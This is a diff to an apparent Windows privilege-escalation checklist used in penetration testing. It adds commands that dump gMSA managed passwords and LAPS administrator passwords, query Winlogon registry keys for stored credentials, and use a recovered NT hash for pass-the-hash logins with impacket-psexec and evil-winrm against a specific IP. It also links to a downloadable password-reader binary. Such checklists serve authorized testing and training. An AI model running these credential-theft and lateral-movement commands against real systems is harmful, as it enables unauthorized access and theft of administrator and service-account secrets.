@@ -7,7 +7,7 @@ functions:
         - [ ] $env:UserName
         - [ ] $Env:Path
         - [ ] $env:PSModulePath
-        - [ ] whoami
+        - [ ] whoami /all #https://gtworek.github.io/Priv2Admin/
         - [ ] net user
         - [ ] net user <username>
         - [ ] hostname
@@ -18,7 +18,8 @@ functions:
         - [ ] wmic process where "ProcessID=1111" get CommandLine, ExecutablePath
         - [ ] wmic process where name^="hfs.exe" get ProcessId,Name,CommandLine
         - [ ] wmic process where name^="hfs.exe" call GetOwner
-        - [ ] accesschk.exe -qvp -accepteula *
+        - [ ] accesschk.exe -qvp -accepteula *  #check write access to services
+        - [ ] ./accesschk64.exe -qvp -accepteula * #check write access to processes
         - [ ] tasklist /SVC
         - [ ] tasklist /v
         - [ ] ipconfig /all
@@ -54,6 +55,28 @@ functions:
         - [ ] netsh interface ipv4 show excludedportrange protocol=tcp
         - [ ] cmdkey /list
         - [ ] Are non-standard apps storing configs in appdata?
+
+    - description: Search for common credential locations
+      code: |
+        - [ ] cmdkey /list
+        - [ ] AD Svc Account Stored Password
+                Import-Module ActiveDirectory
+                Get-ADServiceAccount -Filter * [-Properties *]
+                $gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+                $mp = $gmsa.'msDS-ManagedPassword'
+                Can you Read $mp?
+                ./GMSAPasswordReader.exe --accountname svc_apache  #rc4_hmac --> nthash
+
+                impacket-psexec 'svc_apache$'@192.168.165.165 -hashes 78BC82C952449150A12AD60E870A2BE4:78BC82C952449150A12AD60E870A2BE
+                evil-winrm -i 192.168.165.165 -u svc_apache$ -H 78BC82C952449150A12AD60E870A2BE4
+
+        - [ ] LAPS Passwords
+                Import-Module ActiveDirectory
+                Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+
+                https://mfnttps.github.io/mfnttps/ldap-enum/
+
+        - [ ] reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
     - description: itm4n PrivescCheck
       code: |
@@ -134,4 +157,6 @@ resources: |
   https://github.com/rasta-mouse/Sherlock
   https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
   https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester
+  https://www.thehacker.recipes/ad/movement/access-controls/readgmsapassword
+  https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
 ---
